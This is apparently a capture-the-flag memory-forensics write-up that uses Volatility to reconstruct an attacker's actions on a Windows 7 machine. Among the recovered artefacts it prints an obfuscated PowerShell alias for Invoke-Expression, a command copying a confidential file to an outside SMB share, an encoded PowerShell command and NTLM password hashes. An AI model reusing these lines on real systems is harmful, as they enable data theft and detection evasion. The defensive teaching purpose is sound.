# Recollection

#windows #volatility 
## Description

A junior member of our security team has been performing research and testing on what we believe to be an old and insecure operating system. We believe it may have been compromised & have managed to retrieve a memory dump of the asset. We want to confirm what actions were carried out by the attacker and if any other assets in our environment might be affected. Please answer the questions below.
## Files

We are given a memory dump for analysis. 

```bash
└─$ 7z x recollection.zip -p"hacktheblue"
└─$ la recollection.bin
Permissions Size User Group  Date Modified Name
.rwxrwx---  4.8G root vboxsf  6 Feb 10:03  recollection.bin 
```

I'll use `Volatility 2` and [Hacktricks Volatility - CheatSheet](https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-cheatsheet)
## Tasks

### Task 1. What is the Operating System of the machine?

```powershell
➜ .\vol2.exe -f .\recollection.bin imageinfo
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (~\VBoxShare\recollection.bin)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80002a3f120L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80002a41000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2022-12-19 16:07:30 UTC+0000
     Image local date and time : 2022-12-19 22:07:30 +0600
```

::: tip :bulb: Answer
`Windows 7`
:::

### Task 2. When was the memory dump created?

`Image date and time` row from `imageinfo` contains relevant information.

::: tip :bulb: Answer
`2022-12-19 16:07:30`
:::

### Task 3. After the attacker gained access to the machine, the attacker copied an obfuscated PowerShell command to the clipboard. What was the command?

```powershell
➜ .\vol2.exe -f .\recollection.bin --profile Win7SP1x64_23418 clipboard
Volatility Foundation Volatility Framework 2.6
Session    WindowStation Format                         Handle Object             Data

         1 WinSta0       CF_UNICODETEXT               0x6b010d 0xfffff900c1bef100 (gv '*MDR*').naMe[3,11,2]-joIN''
         1 WinSta0       CF_TEXT                  0x7400000000 ------------------
         1 WinSta0       CF_LOCALE                    0x7d02bd 0xfffff900c209a260
         1 WinSta0       0x0L                              0x0 ------------------
```

::: tip :bulb: Answer
`(gv '*MDR*').naMe[3,11,2]-joIN''`
:::

### Task 4. The attacker copied the obfuscated command to use it as an alias for a PowerShell cmdlet. What is the cmdlet name?

[SECURONIX THREAT RESEARCH KNOWLEDGE SHARING SERIES: HIDING THE POWERSHELL EXECUTION FLOW](https://www.securonix.com/blog/hiding-the-powershell-execution-flow/)

![Writeup.png](/assets/soc/sherlocks/recollection/Writeup.png)

IEX is an alias for [Invoke-Expression](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.4)

::: tip :bulb: Answer
`Invoke-Expression`
:::

### Task 5. A CMD command was executed to attempt to exfiltrate a file. What is the full command line?

To see commands ran on system we can use `cmdline` or `consoles` analysis. (also `cmdscan` too!)

`cmdline` didn't show anything interesting, but `consoles` did.
```powershell
➜ .\vol2.exe -f .\recollection.bin --profile Win7SP1x64_23418 consoles
Volatility Foundation Volatility Framework 2.6
**************************************************
ConsoleProcess: conhost.exe Pid: 3524
Console: 0xff9d6200 CommandHistorySize: 50
HistoryBufferCount: 3 HistoryBufferMax: 4
OriginalTitle: %SystemRoot%\system32\cmd.exe
Title: C:\Windows\system32\cmd.exe - powershell
AttachedProcess: powershell.exe Pid: 3532 Handle: 0xdc
AttachedProcess: cmd.exe Pid: 4052 Handle: 0x60
----
CommandHistory: 0xbef50 Application: powershell.exe Flags: Allocated, Reset
CommandCount: 6 LastAdded: 5 LastDisplayed: 5
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0xdc
Cmd #0 at 0xc71c0: type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt
Cmd #1 at 0xbf230: powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
Cmd #2 at 0x9d1a0: powershell.exe -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
Cmd #3 at 0xc72a0: cd .\Downloads
Cmd #4 at 0xbdf10: ls
Cmd #5 at 0xc2ee0: .\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
```

::: tip :bulb: Answer
`type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt`
:::

### Task 6. Following the above command, now tell us if the file was exfiltrated successfully?

Based on IP not appearing on `netscan` I think it's safe to say the file was not exfiltrated.
```powershell
➜ .\vol2.exe -f .\recollection.bin --profile Win7SP1x64_23418 netscan
```

::: tip :bulb: Answer
`NO`
:::

> Note: There was another line which showed the error `The network path was not found.` and that is the *true* indicator of fail!
### Task 7. The attacker tried to create a readme file. What was the full path of the file?

After trying to exfiltrate the files we see encoded powershell being executed.
```powershell
➜ function BD($base64) { [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64))  }
➜ bd ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi
echo "hacked by mafia" > "C:\Users\Public\Office\readme.txt"
```

::: tip :bulb: Answer
`C:\Users\Public\Office\readme.txt`
:::

### Task 8. What was the Host Name of the machine?

Environment usually holds PC related information.

```powershell
➜ .\vol2.exe -f .\recollection.bin --profile Win7SP1x64_23418 envars --name wininit.exe
Volatility Foundation Volatility Framework 2.6
Pid      Process              Block              Variable                       Value
-------- -------------------- ------------------ ------------------------------ -----
     376 wininit.exe          0x000000000038a630 ALLUSERSPROFILE                C:\ProgramData
     376 wininit.exe          0x000000000038a630 CommonProgramFiles             C:\Program Files\Common Files
     376 wininit.exe          0x000000000038a630 CommonProgramFiles(x86)        C:\Program Files (x86)\Common Files
     376 wininit.exe          0x000000000038a630 CommonProgramW6432             C:\Program Files\Common Files
     376 wininit.exe          0x000000000038a630 COMPUTERNAME                   USER-PC
     376 wininit.exe          0x000000000038a630 ComSpec                        C:\Windows\system32\cmd.exe
     376 wininit.exe          0x000000000038a630 FP_NO_HOST_CHECK               NO
     376 wininit.exe          0x000000000038a630 NUMBER_OF_PROCESSORS           1
     376 wininit.exe          0x000000000038a630 OS                             Windows_NT
     376 wininit.exe          0x000000000038a630 Path                           C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
     376 wininit.exe          0x000000000038a630 PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
     376 wininit.exe          0x000000000038a630 PROCESSOR_ARCHITECTURE         AMD64
     376 wininit.exe          0x000000000038a630 PROCESSOR_IDENTIFIER           Intel64 Family 6 Model 167 Stepping 1, GenuineIntel
     376 wininit.exe          0x000000000038a630 PROCESSOR_LEVEL                6
     376 wininit.exe          0x000000000038a630 PROCESSOR_REVISION             a701
     376 wininit.exe          0x000000000038a630 ProgramData                    C:\ProgramData
     376 wininit.exe          0x000000000038a630 ProgramFiles                   C:\Program Files
     376 wininit.exe          0x000000000038a630 ProgramFiles(x86)              C:\Program Files (x86)
     376 wininit.exe          0x000000000038a630 ProgramW6432                   C:\Program Files
     376 wininit.exe          0x000000000038a630 PSModulePath                   C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
     376 wininit.exe          0x000000000038a630 PUBLIC                         C:\Users\Public
     376 wininit.exe          0x000000000038a630 SystemDrive                    C:
     376 wininit.exe          0x000000000038a630 SystemRoot                     C:\Windows
     376 wininit.exe          0x000000000038a630 TEMP                           C:\Windows\TEMP
     376 wininit.exe          0x000000000038a630 TMP                            C:\Windows\TEMP
     376 wininit.exe          0x000000000038a630 USERNAME                       SYSTEM
     376 wininit.exe          0x000000000038a630 USERPROFILE                    C:\Windows\system32\config\systemprofile
     376 wininit.exe          0x000000000038a630 windir                         C:\Windows
     376 wininit.exe          0x000000000038a630 windows_tracing_flags          3
     376 wininit.exe          0x000000000038a630 windows_tracing_logfile        C:\BVTBin\Tests\installpackage\csilogfile.log
```

::: tip :bulb: Answer
`USER-PC`
:::

### Task 9. How many user accounts were in the machine?

My initial thought was to extract the usernames from `env`:
```powershell
➜ .\vol2.exe -f .\recollection.bin --profile Win7SP1x64_23418 envars | sls Username | % { $_.ToString().Trim().Split()[-1] } | Sort-Object | Get-Unique
Volatility Foundation Volatility Framework 2.6
SERVICE 
SYSTEM
user
USER-PC$
```

But it's better to dump user hashes and identify users that way.
```bash
➜ .\vol2.exe -f .\recollection.bin --profile Win7SP1x64_23418 hashdump
Volatility Foundation Volatility Framework 2.6
Administrator:500:aad3b435b51404eeaad3b435b51404ee:10eca58175d4228ece151e287086e824:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1001:aad3b435b51404eeaad3b435b51404ee:5915a7959c04d8560468296edaefbc9b:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:cb6003ecf6b98b5f7fbbb03df798ac76:::
```

::: tip :bulb: Answer
`3`
:::

### Task 10. In the "\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge" folder there were some sub-folders where there was a file named passwords.txt. What was the full file location/path?

```powershell
➜ .\vol2.exe -f .\recollection.bin --profile Win7SP1x64_23418 filescan
...
0x000000011fc10070      1      0 R--rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt
...
```

### Task 11. A malicious executable file was executed using command. The executable EXE file's name was the hash value of itself. What was the hash value?

During `consoles` analysis we saw the binary run. `.\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe`

::: tip :bulb: Answer
`b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1`
:::

### Task 12. Following the previous question, what is the Imphash of the malicious file you found above?

**Import hash**: _Import hash (or imphash) is **a technique in which hash values are calculated based on the library/imported function (API) names and their particular order within the executable**. If the files were compiled from the same source and in the same manner, those files would tend to have the same imphash value._

Since we have the hash of the file we can do online scanning, such as [VirusTotal](https://www.virustotal.com/gui/file/b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1/details):

![Writeup-1.png](/assets/soc/sherlocks/recollection/Writeup-1.png)

::: tip :bulb: Answer
`d3b592cd9481e4f053b5362e22d61595`
:::

### Task 13: Following the previous question, tell us the date in UTC format when the malicious file was created?

From the VirusTotal "Creation Time".

::: tip :bulb: Answer
`2022-06-22 11:49:04`
:::

### Task 14: What was the local IP address of the machine?

```powershell
➜ curl -LOs https://raw.githubusercontent.com/bryannolen/DFIR-PUBLIC/master/Volatility/ipconfig.py
➜ $ENV:VOLATILITY_PLUGINS="."
➜ .\vol2.exe -f .\recollection.bin --profile Win7SP1x64_23418 ipconfig
Volatility Foundation Volatility Framework 2.6
Name                           GUID                                   DHCP IP Address       Gateway
------------------------------ -------------------------------------- ---- ---------------- ----------------
Local Area Connection         {714B7AE4-6844-4BEA-B657-5173B1BC5101} Yes  192.168.0.104   192.168.0.1
```

```powershell
➜ .\vol2.exe -f .\recollection.bin --profile Win7SP1x64_23418 netscan| sls TCPv4 | % { $_.ToString().Trim().Split()[12].Split(':')[0] } | Sort-Object | Get-Unique
0.0.0.0
192.168.0.104
```

::: tip :bulb: Answer
`192.168.0.104`
:::

### Task 15: There were multiple PowerShell processes, where one process was a child process. Which process was its parent process?

```powershell
➜ .\vol2.exe -f .\recollection.bin --profile Win7SP1x64_23418 pstree | Tee-Object pstree.log
Volatility Foundation Volatility Framework 2.6
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
 0xfffffa8005967060:explorer.exe                     2032   1988     23    906 2022-12-19 15:33:13 UTC+0000
. 0xfffffa8003de2750:notepad.exe                     3476   2032      1     62 2022-12-19 15:50:42 UTC+0000
. 0xfffffa80059e9b00:msedge.exe                      2380   2032     43   1123 2022-12-19 15:34:29 UTC+0000
.. 0xfffffa800383cb00:msedge.exe                     2752   2380     16    300 2022-12-19 15:34:32 UTC+0000
.. 0xfffffa8003ce4700:msedge.exe                     2060   2380     15    255 2022-12-19 15:53:59 UTC+0000
.. 0xfffffa80055e3160:msedge.exe                     2396   2380      8     87 2022-12-19 15:34:29 UTC+0000
.. 0xfffffa800586e2d0:msedge.exe                     2588   2380     16    235 2022-12-19 15:34:31 UTC+0000
.. 0xfffffa8003bc1b00:msedge.exe                     2160   2380     12    161 2022-12-19 16:03:52 UTC+0000
.. 0xfffffa8003d7c060:msedge.exe                     3560   2380     15    330 2022-12-19 16:03:48 UTC+0000
.. 0xfffffa8005addb00:msedge.exe                     3032   2380     12    191 2022-12-19 15:34:35 UTC+0000
.. 0xfffffa800586eb00:msedge.exe                     2680   2380      8    142 2022-12-19 15:34:31 UTC+0000
.. 0xfffffa8003b16b00:msedge.exe                      980   2380     12    195 2022-12-19 15:35:05 UTC+0000
. 0xfffffa8003cbc060:cmd.exe                         4052   2032      1     23 2022-12-19 15:40:08 UTC+0000
.. 0xfffffa8005abbb00:powershell.exe                 3532   4052      5    606 2022-12-19 15:44:44 UTC+0000
. 0xfffffa8003d6b060:powershell.exe                  3688   2032      5    367 2022-12-19 15:43:39 UTC+0000
<snip>
```

::: tip :bulb: Answer
`cmd.exe`
:::

### Task 16: Attacker might have used an email address to login a social media. Can you tell us the email address?

I was unable to dump the `iehistory`, but found this blog post: [Extracting Browser History artifacts using Memory Forensics: Volatility](https://www.eyehatemalwares.com/digital-forensics/blog-df/browser-history/)

I tried extracting URLs via Yara rule and the output was overwhelming. My poor attempt to parse the urls was not so good too D:
```powershell
➜ .\vol2.exe -f .\recollection.bin --profile Win7SP1x64_23418 yarascan -Y "/(https?:\/\/)?([\w\.-]+)([\/\w \.-]*)/" -p 2380 | Tee-Object yarascan.log 
➜ cat .\yarascan.log | % { if ($_.Startswith('0x')) { Write-Host -NoNewline $_.Substring(62).Trim() }; if ($_.Startswith('Owner')) { Write-Host ("`n" + '-'*30); } }
➜ cat .\yarascan.log | % { if ($_.Startswith('0x')) { $_.Substring(62).Trim() | Out-File -FilePath .\urlz.txt -Append -NoNewline  }; if ($_.Startswith('Owner')) { "`n" + '-'*30 | Out-File -FilePath .\urlz.txt -Append; } }
```

`strings` command was more useful for this case and since we had URL matching regex from Yara it was easy to extract urls. I narrowed down to `login` because that's the most likely endpoint that exists on social media for login. 
```bash
└─$ strings -el recollection.bin | grep -P '/(https?:\/\/)?([\w\.-]+)([\/\w \.-]*)/' -o > urls.txt
└─$ cat urls.txt | grep 'login' | sort | uniq -c | sort -nr | bat # > urls2.txt
───────┬───────────────────────────────────────────────────────────────────────────────
       │ STDIN
───────┼───────────────────────────────────────────────────────────────────────────────
   1   │      21 /www.facebook.com/login/
   2   │      11 /login.microsoftonline.com/
   3   │       7 /login/
   4   │       3 /www.facebook.com/login/device-based/regular/login/
   5   │       3 /login.live.com/
   6   │       2 /login.windows-ppe.net/
   7   │       2 /login.windows.net/
   8   │       2 /login-us.microsoftonline.com/
   9   │       2 /login.usgovcloudapi.net/
  10   │       2 /login.partner.microsoftonline.cn/
  11   │       2 /login.microsoft-ppe.com/
  12   │       2 /login.microsoftonline.us/
  13   │       2 /login.microsoftonline.de/
  14   │       2 /login.microsoft.com/
  15   │       2 /login.cloudgovapi.us/
  16   │       2 /login.chinacloudapi.cn/
  17   │       1 /login.microsoftonline.com/common/oauth2/
───────┴───────────────────────────────────────────────────────────────────────────────
```

We see few requests made to `facebook` and 3 of the include device-based authentication. 
But we need an email address.
```bash
└─$ strings -el recollection.bin | grep 'mail' -in | grep '@'
17354:mafia_code1337@gmail.com
25839:mafia_code1337@gmail.com
...
68792:a_code1337@gmail.com
```

::: tip :bulb: Answer
`mafia_code1337@gmail.com`
:::

### Task 17: Using MS Edge browser, the victim searched about a SIEM solution. What is the SIEM solution's name?

Know we really need MS Edge browser history. First locate the History file which contains edge history:
```powershell
➜ .\vol2.exe -f .\recollection.bin --profile Win7SP1x64_23418 -k 0x000000011fa9e450 filescan | Tee-Object -Filepath filescan.log
➜ cat .\filescan.log | sls history

0x000000011de6e9c0     16      0 R--rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History-journal
0x000000011deb9220     18      1 RW-rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\Nurturing\campaign_history
0x000000011e0795f0     18      1 RW-rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Nurturing\campaign_history
0x000000011e0d16f0     17      1 RW-rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History
0x000000011e4d59e0     16      0 R--rwd \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Windows\History\desktop.ini
0x000000011fc57a10     17      1 RW-rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History-journal
```

Dump files:
```powershell
➜ $dumpdir = "edge_history"; mkdir $dumpdir; .\vol2.exe -f .\recollection.bin --profile Win7SP1x64_23418 dumpfiles -n --dump-dir $dumpdir -Q 0x000000011e0d16f0
...
Volatility Foundation Volatility Framework 2.6
DataSectionObject 0x11e0d16f0   None   \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History
SharedCacheMap    0x11e0d16f0   None   \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History
---
└─$ file *
file.None.0xfffffa80056d1440.History.dat:  SQLite 3.x database, last written using SQLite version 3039004, file counter 5, database pages 40, cookie 0x1f, schema 4, UTF-8, version-valid-for 5
file.None.0xfffffa80058825f0.History.vacb: empty
```

![Writeup-2.png](/assets/soc/sherlocks/recollection/Writeup-2.png)

Looks like the victim not only searched, but downloaded SIEM solution: [Wazuh - Open Source XDR. Open Source SIEM.](https://wazuh.com/)

::: tip :bulb: Answer
`Wazuh`
:::

### Task 18: The victim user downloaded an exe file. The file's name was mimicking a legitimate binary from Microsoft with a typo (i.e. legitimate binary is powershell.exe and attacker named a malware as powershall.exe). Tell us the file name with the file extension?

In edge download history we noticed `<hash>.zip` was downloaded. We can filter `filescan` by directory to see if it was extracted in same directory:
```powershell
➜ cat .\filescan.log | sls downloads

0x000000011dff8aa0      2      1 R--rwd \Device\HarddiskVolume2\Users\user\Downloads
0x000000011e0ee070     16      0 R--rw- \Device\HarddiskVolume2\Users\user\Links\Downloads.lnk
0x000000011e580e40     15      0 R--rwd \Device\HarddiskVolume2\Users\user\Downloads\desktop.ini
0x000000011e7d1aa0      2      1 R--rwd \Device\HarddiskVolume2\Users\user\Downloads
0x000000011e955820     16      0 -W-r-- \Device\HarddiskVolume2\Users\user\Downloads\csrsss.exe9541153d0e2cd21bdae11591f6be48407f896b75e1320628346b03.exe
0x000000011ee95460     12      0 R--rw- \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.zip
0x000000011fa45c20     16      0 -W-r-- \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
0x000000011fc1db70      2      0 R--r-d \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
0x000000011fd79a90     16      0 RW-rwd \Device\HarddiskVolume2\Users\user\Downloads\7z2201-x64.exe
0x000000011fdbd560     16      0 R--rwd \Device\HarddiskVolume2\Users\Public\Downloads\desktop.ini
0x000000011fdeb470     10      0 R--r-d \Device\HarddiskVolume2\Users\user\Downloads\csrsss.exe9541153d0e2cd21bdae11591f6be48407f896b75e1320628346b03.exe
0x000000011fe5b070     15      0 R--r-- \Device\HarddiskVolume2\Users\user\Downloads\bf9e9366489541153d0e2cd21bdae11591f6be48407f896b75e1320628346b03.zip
```

We see few `exe` files and the executable that seems to be mimicking the legitimate program is `csrsss.exe`

::: tip :bulb: Answer
`csrsss.exe`
:::
